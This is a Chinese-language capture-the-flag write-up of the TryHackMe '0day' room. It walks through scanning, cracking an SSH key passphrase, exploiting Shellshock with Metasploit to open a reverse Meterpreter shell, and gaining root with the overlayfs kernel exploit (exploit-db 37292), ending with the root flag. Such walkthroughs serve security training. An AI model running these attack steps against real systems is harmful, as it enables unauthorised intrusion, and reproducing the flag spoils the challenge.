# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务扫描
```
┌──(root💀kali)-[~/tryhackme/0day]
└─# nmap -sV  -Pn -A -O  10.10.209.66                                                                                                                                                                                                 130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 03:52 EDT
Nmap scan report for 10.10.209.66
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

开启了ssh和http服务

# 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100  -u http://10.10.209.66        

 _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
(_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 6100

Error Log: /root/dirsearch/logs/errors-21-10-21_04-07-47.log

Target: http://10.10.209.66                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
[04:07:48] Starting: 
[04:07:53] 301 -  311B  - /admin  ->  http://10.10.209.66/admin/                 
[04:07:54] 200 -    0B  - /admin/                 
[04:07:54] 403 -  294B  - /admin/.htaccess
[04:07:54] 200 -    0B  - /admin/?/login         
[04:07:54] 200 -    0B  - /admin/index.html                                                                 
[04:07:57] 301 -  312B  - /backup  ->  http://10.10.209.66/backup/                                                
[04:07:57] 200 -    2KB - /backup/                                    
[04:07:58] 403 -  287B  - /cgi-bin/                                     
[04:07:58] 301 -  313B  - /cgi-bin  ->  http://10.10.209.66/cgi-bin/
[04:07:58] 200 -   13B  - /cgi-bin/test.cgi          
[04:07:59] 301 -  309B  - /css  ->  http://10.10.209.66/css/                   
[04:08:02] 301 -  309B  - /img  ->  http://10.10.209.66/img/                                          
[04:08:02] 200 -    3KB - /index.html                                                                          
[04:08:02] 301 -  308B  - /js  ->  http://10.10.209.66/js/                                              
[04:08:07] 200 -   38B  - /robots.txt                                                          
[04:08:07] 301 -  312B  - /secret  ->  http://10.10.209.66/secret/                                      
[04:08:07] 200 -  109B  - /secret/
[04:08:07] 403 -  292B  - /server-status       
[04:08:07] 403 -  293B  - /server-status/
[04:08:09] 200 -    0B  - /uploads/                                                                               
[04:08:09] 301 -  313B  - /uploads  ->  http://10.10.209.66/uploads/

```


在```/robots.txt```页面受到了作者的嘲讽

>You really thought it'd be this easy?

在```/backup/```目录下找到一个ssh 私钥文件，下载到本地用ssh2john破解得到私钥密码
```
┌──(root💀kali)-[~/tryhackme/0day]
└─# /usr/share/john/ssh2john.py id_rsa >rsacrack
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/0day]
└─# ls             
id_rsa  rsacrack
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/0day]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt rsacrack 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:42 66.85% (ETA: 03:20:21) 0.02373g/s 227710p/s 227710c/s 227710C/s blackcurrent00..blackcow15
Session aborted

```

私钥密码是：```letmein```

所以用户名是什么？找了一圈没找到，难道是兔子洞？


用```nikto```挖掘网站漏洞
```
┌──(root💀kali)-[~/tryhackme/0day]
└─# nikto -h http://10.10.209.66                   
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.209.66
+ Target Hostname:    10.10.209.66
+ Target Port:        80
+ Start Time:         2021-10-21 03:54:16 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Uncommon header '93e4r0-cve-2014-6271' found, with contents: true
+ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /backup/: This might be interesting...
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /secret/: This might be interesting...
+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.

```

发现```/cgi-bin/test.cgi```很可能存在```shellshock```漏洞（版本号```CVE-2014-6278```）

# 攻击

在msf里搜索这个漏洞
```
msf6 > search shellshock 2014-6278

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env   2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/multi/http/apache_mod_cgi_bash_env_exec  2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2  exploit/multi/http/cups_bash_env_exec            2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
```

选择探测模块```scanner/http/apache_mod_cgi_bash_env```

```
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set targeturi /cgi-bin/test.cgi
targeturi => /cgi-bin/test.cgi
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

探测成功了！

再次选择攻击模块```multi/http/apache_mod_cgi_bash_env_exec```

```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test.cgi
targeturi => /cgi-bin/test.cgi
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.10.209.66
[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.209.66:33088) at 2021-10-21 04:23:00 -0400

meterpreter > shell
Process 1057 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

成功拿到初始shell

在```/home/ryan```拿到user.txt

# 提权

查看系统版本
```
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

```
这个是一个比较老的linux版本了，因此我们从内核提权的思路出发

把内核枚举脚本（内核提权枚举脚本推荐[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)）通过msf传到靶机，枚举内核提权信息，这里列举三个```highly probable```的提权脚本一个个尝试
```
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

```
最后37292这个脚本证实可以提权成功

上传脚本到靶机

```
meterpreter > upload /root/tryhackme/0day/37292.c ./37292.c
[*] uploading  : /root/tryhackme/0day/37292.c -> ./37292.c
[*] Uploaded -1.00 B of 5.00 KiB (-0.02%): /root/tryhackme/0day/37292.c -> ./37292.c
[*] uploaded   : /root/tryhackme/0day/37292.c -> ./37292.c
meterpreter > shell
Process 6979 created.
Channel 12 created.
ls
37292.c
40611.c
bLMlC
dirtyc0w
foo
l.txt
les.sh
```
在靶机上编译、执行这个攻击脚本。拿到root flag
```
gcc 37292.c  -o ofs
ls
37292.c
40611.c
bLMlC
dirtyc0w
foo
l.txt
les.sh
ofs
chmod +x ofs
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```